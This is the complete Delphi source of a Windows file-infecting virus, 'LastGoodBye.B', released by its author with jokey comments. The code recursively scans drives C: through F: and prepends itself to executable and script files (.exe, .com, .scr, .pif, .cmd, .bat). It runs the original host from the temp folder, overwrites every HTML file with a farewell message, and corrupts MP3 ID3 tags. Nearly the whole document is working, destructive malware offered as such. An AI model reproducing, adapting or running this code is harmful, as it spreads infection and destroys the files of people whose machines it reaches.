   {

     This worm uses no stub, becouse it IS the stub.
     It put in the host-file into itself, and on execution
     it extract the host to temp-directory, and run it
     and also run itself.

     For moment it doesnt change to host's icon, which
     im trying to fix for future releases.

     I also added a payload where it modifyies all found
     mp3-songs ID3v1 Tag, and also disabled ID3v2 tag.

     This would be hell for a music-collector.

     People ive got source from:

      Release, FileOpen, File-etc   : MultiBinder (GUI) By TheThinker
      FindFile, Find-etc            : ~LOM~

     Notice :
      Infection-Source is a console modification and a real remake of
      TheThinkers binder-source.

     Greets, p0ke.
     http://p0ke.no-ip.com

   }

   program Project1;
   { Since we done need more then Windows Library, why use more ? ;D }
   uses
     Windows;

   { Here we declare all the cool things we gonna use }

     { Used for Infection }
     Type
     TAttachmentHeader = record
       MagicNumber: cardinal;
       CRC: cardinal;
       Size: int64;
       IsStub: boolean;
       FileName: array[0..MAX_PATH] of char;
     end;
     PAttachmentHeader = ^TAttachmentHeader;

     { Used for searching files }
     type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     { Used for searching files }
     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;


   { Here we declare all consts :) }
   const
     fmOpenRead                          = $0000;       { I think we use this }
     fmOpenWrite                         = $0001;       { Im sure we use this }
     fmOpenReadWrite                     = $0002;       { .. do we use this ? }
     fmShareCompat                       = $0000;       { .. what the hell is this one ? }
     fmShareExclusive                    = $0010;       { no clue }
     fmShareDenyWrite                    = $0020;       { no damn clue }
     fmShareDenyRead                     = $0030;       { wtf. }
     fmShareDenyNone                     = $0040;       { err.. ok }
     FILE_ATTRIBUTE_READONLY             = $00000001;   { To be honest.. ive added alot of these }
     FILE_ATTRIBUTE_HIDDEN               = $00000002;   { in CASE if we need it. }
     FILE_ATTRIBUTE_SYSTEM               = $00000004;   { we actully just use read/write const's }
     FILE_ATTRIBUTE_VOLUMEID             = $00000008;   { so all other is just shit.. }
     FILE_ATTRIBUTE_ARCHIVE              = $00000020;
     FILE_ATTRIBUTE_DIRECTORY            = $00000010;
     FILE_ATTRIBUTE_ANYFILE              = $0000003F;

   { Variables :D:D:D }
   Var
     Virus  : tHandle;                   { Handle for open file }
     OutPut : tHandle;                   { Handle for the output file }
     Header : tAttachmentHeader;         { Header- thingy }
     itemHeader : pAttachmentHeader;     { To get filename/header-stuff }

     fName  : String;                    { To put filename in and abuse }
     StubSize : int64;                   { I think it has to do with binarypr0n something... }

     Msg    : tMsg;                      { Leave a alien massage for the future to decode. }

   { Function allocmem. To be honest, i dont know what it does }
   { but it seems like we need it ;D }
   function AllocMem(Size: Cardinal): Pointer;
   begin
     GetMem(Result, Size);
     FillChar(Result^, Size, 0);
   end;

   { StrPas, kinda same. Doesnt know wtf it does. :D }
   function StrPas(const Str: PChar): string;
   begin
     Result := Str;
   end;

   { Damn this ASM! Its so beautifull, yet so evil! }
   function StrLCopy(Dest: PChar; const Source: PChar; MaxLen: Cardinal): PChar; assembler;
   asm
           PUSH    EDI
           PUSH    ESI
           PUSH    EBX
           MOV     ESI,EAX
           MOV     EDI,EDX
           MOV     EBX,ECX
           XOR     AL,AL
           TEST    ECX,ECX
           JZ      @@1
           REPNE   SCASB
           JNE     @@1
           INC     ECX
   @@1:    SUB     EBX,ECX
           MOV     EDI,ESI
           MOV     ESI,EDX
           MOV     EDX,EDI
           MOV     ECX,EBX
           SHR     ECX,2
           REP     MOVSD
           MOV     ECX,EBX
           AND     ECX,3
           REP     MOVSB
           STOSB
           MOV     EAX,EDX
           POP     EBX
           POP     ESI
           POP     EDI
   end;

   { Gimme a F, I, L, E, S, I, Z, E .. Whats that ? }
   Function FFileSize(FileName: String): int64;
   Var
     H: tHandle;
     fData: tWin32FindData;
   Begin
     Result := -1;
     H := FindFirstFile(pChar(FileName), fData);
     If H <> INVALID_HANDLE_VALUE Then
     Begin
       Windows.FindCLose(H);
       Result := Int64(fData.nFileSizeHigh) shl 32 +
       fData.nFileSizeLow;
     End;
   End;

   { Get head? yes please, if its free. }
   Function GetHeader(FileW: String): pAttachmentHeader;
   Var
     Header: pAttachmentHeader;
   Begin
     Header := AllocMem(SizeOf(tAttachmentHeader));
     StrLCopy(@Header.Filename, pChar(FileW), MAX_PATH);
     Header.Size := FFileSize(FileW);
     Header.IsStub := False;
     Result := Header;
   End;

   { Now... the time has come for us to infect human kind.... }
   { ... or atleast their files }
   Procedure infectFile(Victime:String);
   Var
     Buffer: Array[0..2048] Of Char;
     BytesRead, BytesWritten: LongWord;
     F:File;
     Str:String;
     I:Integer;
   Begin

     { Lets check if mark is still there.. }

     {$i-}
      AssignFile(F, Victime);
      FileMode:=0;
      Reset(F, 1);
      I := FileSize(F);
      SetLength(Str,FileSize(F));
      BlockRead(F, Str[1], I);
      CloseFile(F);
     {$i+}

     { "Hey Mark, Its me, Kurt! You  There?" }
     If Pos('LastGoodBye',Str)>0 Then Exit;

     { What a looser... or a zero. }
     ZeroMemory(@Buffer, SizeOf(Buffer));
     { Where do we put all this shit ? }
     OutPut := CreateFile(pChar(Victime+'-'),
               GENERIC_WRITE,
               FILE_SHARE_WRITE,
               NIL,
               CREATE_NEW,
               FILE_ATTRIBUTE_NORMAL,
               0);
     { Is this that HEAD i was promised before? }
     itemHeader := GetHeader(ParamStr(0));
     { Abuse fName jsut as i promised }
     fName      := StrPas(@itemHeader.FileName);

     { VIRUS? O_o }
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);
     Repeat
       { New gets in, Old gets out.. }
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       { New Goes In, Old Goes Out -> }
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);

     { More Head? sure. }
     itemHeader := GetHeader(Victime);
     { Abusement is the funniest thing in world }
     fName      := StrPas(@itemHeader.FileName);

     { Feed me with beefs. }
     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     { "I feel sorry for the victim now" }
     {     Bob Marley - Pimpers Paradies }
     Header.Size := FFileSize(Victime);
     Header.IsStub := False;
     { aaaaaah... AAAAAAH.... ABUSE! }
     Header.FileName := itemHeader.FileName;

     { ... OuTput teh Head! }
     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);

     { Another virus? again ? }
     Virus  := CreateFile(pChar(fName),
               GENERIC_READ,
               FILE_SHARE_READ,
               NIL,
               OPEN_EXISTING,
               FILE_ATTRIBUTE_NORMAL,
               0);

     { Comments for this procedure ends here ;D }
     Repeat
       ReadFile(Virus, Buffer, 2048, BytesRead, NIL);
       WriteFile(OutPut, Buffer, BytesRead, BytesWritten, NIL);
     Until BytesWritten = 0;
     CloseHandle(Virus);

     itemHeader := GetHeader(ParamStr(0));
     fName := StrPas(@itemHeader.FileName);
     StubSize := FFileSize(ParamStr(0));

     Header.MagicNumber := $FEEDBEEF;
     Header.CRC := 0;
     Header.Size := StubSize;
     Header.IsStub := True;

     FillChar(Header.FileName, MAX_PATH+1, 0);

     WriteFile(OutPut, Header, SizeOf(Header), BytesWritten, NIL);
     { Almost ;D here is Mark. Mark, meet coder. }
     Str := 'LastGoodBye';
     WriteFile(OutPut, Str[1], Length(Str), BytesWritten, NIL);
     CloseHandle(OutPut);
     DeleteFile(pChar(Victime));
     CopyFile  (pChar(Victime+'-'), pChar(Victime), False);
     DeleteFile(pChar(Victime+'-'));

   End;

   { Spawn teh file., i will keep this uncommented.}
   function SpawnProgram(Filename: string): boolean;
    function ErrorString(ErrorCode: integer): string;
    var
      buffer: array[0..1024] of char;
    begin
      FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, nil, ErrorCode, 0, @buffer, sizeof(buffer)-1, nil);
      result:= string(@buffer);
    end;

   var
     si: TStartupInfo;
     pi: TProcessInformation;
   begin
     FillChar(si, sizeof(si), 0);
     si.cb:= sizeof(si);
     si.dwFlags:= STARTF_USESHOWWINDOW;
     si.wShowWindow:= SW_SHOWDEFAULT;
     if not CreateProcessA(nil, PChar(Filename), nil, nil, false, 0, nil, nil, si, pi) then
     begin
       result:= false;
       Exit;
       Halt(0);
     end
     else
       result:= true;
   end;

   { TEMP PATH !? what we all ever wanted }

   function GetTmpPath: string;
   var
   buffer: array[0..MAX_PATH] of char;
   begin
     result:= '';
     if GetTempPathA(MAX_PATH, buffer) <> 0 then
     begin
       result:= String(PChar(@buffer));
       if result[length(result)] <> '\' then
       result:= result + '\';
     end;
   end;

   { Does -- teh -- file -- exist ? }
   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   { File Open is a cool function, but its not written but me :D }
   function FileOpen(const FileName: string; Mode: LongWord): Integer;
   const
     AccessMode: array[0..2] of LongWord = (
     GENERIC_READ,
     GENERIC_WRITE,
     GENERIC_READ or GENERIC_WRITE);
     ShareMode: array[0..4] of LongWord = (
     0,
     0,
     FILE_SHARE_READ,
     FILE_SHARE_WRITE,
     FILE_SHARE_READ or FILE_SHARE_WRITE);
   begin
     Result := Integer(CreateFileA(PChar(FileName), AccessMode[Mode and 3],
     ShareMode[(Mode and $F0) shr 4], nil, OPEN_EXISTING,
     FILE_ATTRIBUTE_NORMAL, 0));
   end;

   { Same with This, Not Written By me }
   function FileCreate(const FileName: string): Integer;
   begin
     Result := Integer(CreateFileA(PChar(FileName), GENERIC_READ or GENERIC_WRITE,
     0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0));
   end;

   { Not me. }
   procedure FileClose(Handle: Integer);
   begin
     CloseHandle(THandle(Handle));
   end;

   { Not me :D }
   Procedure Release;
   var
     buffer: array[0..$ffff] of byte;
     fSource, fTemp: THandle;
     BytesRead, BytesWritten: cardinal;
     NeededSize, BufferRead: cardinal;
     tmppath, fname, tname: string;
     Header: TAttachmentHeader;
   begin
     TmpPath := GetTmpPath;
     Try
       FSource := FileOpen(ParamStr(0), fmOpenRead or fmShareDenyWrite);
       If FSource = THandle(-1) Then
       Begin
         Exit;
         Halt(0);
       End;
       Try
         SetFilePointer(FSource, GetFileSize(FSource, NIL) - SizeOf(TAttachmentHeader), NIL, FILE_BEGIN);
         ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
         if (Header.MagicNumber <> $FEEDBEEF) or (BytesRead <> SizeOf(Header)) Then
         Begin
           Exit;
           FileClose(FSource);
           Halt(0);
         End;
         SetFilePointer(FSource, Header.Size, NIL, FILE_BEGIN);
         While (SetFilePointer(FSource, 0, NIL, FILE_CURRENT) <= (GetFileSize(FSource, NIL) - SizeOf(Header))) Do
         Begin
           ReadFile(FSource, Header, SizeOf(Header), BytesRead, NIL);
           If Header.MagicNumber <> $FEEDBEEF Then
           Begin
             Exit;
             Halt(0);
           End;
           FName := Header.FileName;
           Repeat
             Str(GetTickCount, TName);
             Fname := 'tmp'+tname+'.exe';
             Sleep(0);
           Until Not FileExists(TmpPath+Fname);
           fTemp := FileCreate(TmpPath + Fname);
           NeededSize := Header.Size;
           Repeat
             If NeededSize > SizeOf(Buffer) Then
               BufferRead := SizeOf(Buffer)
             Else
               BufferRead := NeededSize;
             ReadFile(FSource, Buffer, BufferRead, BytesRead, NIL);
             WriteFile(FTemp, Buffer, BytesRead, BytesWritten, NIL);
             Dec(NeededSize, BytesRead);
           Until (BytesRead <> BufferRead) Or (NeededSize = 0);
           FileClose(FTemp);
           If (NeededSize <> 0) Or (Not SpawnProgram(TmpPath + Fname)) Then
           Begin
             FileClose(FSource);
             Halt(0);
           End;
         End;
         FileClose(FSource);
         Finally
           End;
       Finally
         End;
   End;

   { Function by ~LOM~ .. no matter how much i hate him i cannot skip to credit him. }
   function FindMatchingFile(var F: TSearchRec): Integer;
   var
     LocalFileTime: TFileTime;
   begin
     with F do
     begin
       while FindData.dwFileAttributes and ExcludeAttr <> 0 do
         if not FindNextFile(FindHandle, FindData) then
         begin
           Result := GetLastError;
           Exit;
         end;
       FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
       FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
         LongRec(Time).Lo);
       Size := FindData.nFileSizeLow;
       Attr := FindData.dwFileAttributes;
       Name := FindData.cFileName;
     end;
     Result := 0;
   end;

   { Function by ~LOM~ .. no matter how much i hate him i cannot skip to credit him. }
   procedure FindClose(var F: TSearchRec);
   begin
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Windows.FindClose(F.FindHandle);
       F.FindHandle := INVALID_HANDLE_VALUE;
     end;
   end;

   { Function by ~LOM~ .. no matter how much i hate him i cannot skip to credit him. }
   function FindFirst(const Path: string; Attr: Integer;
     var  F: TSearchRec): Integer;
   const
     faSpecial = FILE_ATTRIBUTE_Hidden or FILE_ATTRIBUTE_System or FILE_ATTRIBUTE_VolumeID or FILE_ATTRIBUTE_Directory;
   begin
     F.ExcludeAttr := not Attr and FILE_ATTRIBUTE_READONLY;
     F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
     if F.FindHandle <> INVALID_HANDLE_VALUE then
     begin
       Result := FindMatchingFile(F);
       if Result <> 0 then FindClose(F);
     end else
       Result := GetLastError;
   end;

   { Function by ~LOM~ .. no matter how much i hate him i cannot skip to credit him. }
   function FindNext(var F: TSearchRec): Integer;
   begin
     if FindNextFile(F.FindHandle, F.FindData) then
       Result := FindMatchingFile(F) else
       Result := GetLastError;
   end;

   { HAHAHAHAHA this was not made by LOM. IN YOur FACE! }
   function LowerCase(const S: string): string;
   var
    Len: Integer;
   begin
    Len := Length(S);
    SetString(Result, PChar(S), Len);
    if Len > 0 then CharLowerBuff(Pointer(Result), Len);
   end;

   { look what i made mommy }
   Function ExtractFileExtension(fName:String):String;
   Var
    I:Integer;
   Begin
    I := Length(fName);
    While Copy(fName, i, 1) <> '.' Do
     Dec(i);
    Result := LowerCase(Copy(fName, i, Length(fName)));
   End;

   { This i also made.. took me a while, but it _SHOULD_ work fine. }
   Procedure ChangeID3Tag(FN:String);
   VAR
    A        : FILE;
    Buf      : String;
    TAG:Integer;
    F  :TextFile;
    Title,
    Artist,
    Comment,
    Album,
    Year:String;
    L1, L2, Line:String;
    Content:String;
    Ch : String;
    I,j : Integer;
    kuk:integeR;
   begin



    Artist := 'ViriiMakers';
    Title  := 'The Last Goodbye';
    Album  := 'FirstAndLast';
    Comment:= 'PE_LastGoodBy';
    Year   := '2004';

    Tag := 0;

     {$I-}

     kuk := 128;
     setlength(buf, 0);

     AssignFile(A, FN);
     FileMode:=0;
     Reset(A,1);
     IF IOResult<>0 THEN EXIT;
     SetLength(Buf,FileSize(A));
     BlockRead(A,Buf[1],FileSize(A));
     CloseFile(A);
     {$I+}
     Content := Buf;
     Line := Buf;

     Line := '.'+Copy(Line,(length(Line)-Kuk)+1, length(Line));
     Repeat
      Line := Copy(Line, 2, Length(Line));
     Until (Copy(Line, 1, 3) = 'TAG') or (Copy(Line, 1, 3) = '');
     If Line = '' Then Exit;
     For I := 1 To Length(Line)-2 Do Begin
      Delete(Line, I, 1);
      Insert(#0, Line, I);
     End;
     Delete(Line, 1, 3);
     Insert('TAG', Line, 1);
     Delete(Line, 4, Length(Title));
     Insert(Title, Line, 4);
     Delete(Line, 34, Length(Album));
     Insert(Artist, Line, 34);
     Delete(Line, 64, Length(Artist));
     Insert(Album, Line, 64);
     Delete(Line, 94, Length(Year+Comment));
     Insert(Year+Comment, Line, 94);

    Content := Copy(Content, 1, Length(Content)-Kuk)+LINE;
    If Copy(Content, 1, 3) = 'ID3' Then Content := Copy(Content, 2, Length(Content));

    AssignFile(F, FN+'_');
    ReWrite(F);
    Write(F, Content);
    CloseFile(F);


    If DeleteFile(pCHar(FN)) Then Begin
     If CopyFile(pChar(Fn+'_'), pChar(FN), False) Then
      DeleteFile(pCHar(FN+'_'));
    End;

   End;

   { WriteTehFile overwrites a file with this nice text i wrote }
   Procedure WriteTehFile(FileName:String);
   Var
    F:TextFile;
   Begin
    assignfile(f, FileName);
    rewrite(f);
    WriteLn(F,'My Last GoodBye...');
    WriteLn(F,'');
    WriteLn(F,'I really never though this time would come,');
    WriteLn(F,'but since it seems like the "scene" only has');
    WriteLn(F,'kiddies in it nowerdays its kinda hard to stick');
    WriteLn(F,'with it. Ive tried so hard, but its killing me');
    WriteLn(F,'knowing that we are slowly dieing.');
    WriteLn(F,'');
    WriteLn(F,'Therefor i stop my activites today.');
    WriteLn(F,'I walk my way and leave the vxscene behind.');
    WriteLn(F,'The great people who has supported me should');
    WriteLn(F,'be thanked.');
    WriteLn(F,'Tho i cannot write any names / channels here');
    WriteLn(F,'so i just skip it.');
    WriteLn(F,'');
    WriteLn(F,'I loved it once... but now its rotting away.');
    WriteLn(F,'');
    WriteLn(F,'Greets to all TRUE vxers! Keep it up..');
    WriteLn(F,'');
    WriteLn(F,'');
    WriteLn(F,' Later.');
    closefile(f);
   End;
   { And yes, text is true }

   { ListFiles, very_very_very modified version of a simple function ~LOM~ wrote. }
   procedure ListFiles(D, Name, SearchName : String);
   var
     SR: TSearchRec;
   begin
     If D[Length(D)] <> '\' then D := D + '\';

     If FindFirst(D + '*.*', FILE_ATTRIBUTE_Directory, SR) = 0 then
       Repeat
         If ((Sr.Attr and FILE_ATTRIBUTE_Directory) = FILE_ATTRIBUTE_Directory) and (SR.Name[1] <> '.') and
            (LowerCase(Sr.Name) <> 'windows') and (LowerCase(Sr.Name) <> 'winnt') Then
           ListFiles(D + SR.Name + '\', Name, SearchName)
         Else Begin
           If ExtractFileExtension(SR.Name) = '.exe' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.com' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.scr' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.pif' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.cmd' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.bat' then InfectFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.mp3' then ChangeID3Tag(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = '.htm' then WriteTehFile(D+Sr.Name);
           If ExtractFileExtension(SR.Name) = 'html' then WriteTehFile(D+Sr.Name);
         End;
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   end;

   { Start :D }
   begin
    { Write GoodBye }
    WriteTehFile('C:\LastGoodBye.B.Txt');
    { Release bound files }
    Release;
    { Check so we dont have a copy runnning already }
    CreateMutexA(NIL, FALSE, 'LastGoodBye.B');
    If GetLastError() = ERROR_ALREADY_EXISTS Then
     ExitProcess(0);

    { Search for files, infect, overwrite, and change id3tags... BWUHAHA }
    ListFiles('C:\','*','*.*');
    ListFiles('D:\','*','*.*');
    ListFiles('E:\','*','*.*');
    ListFiles('F:\','*','*.*');
   end.
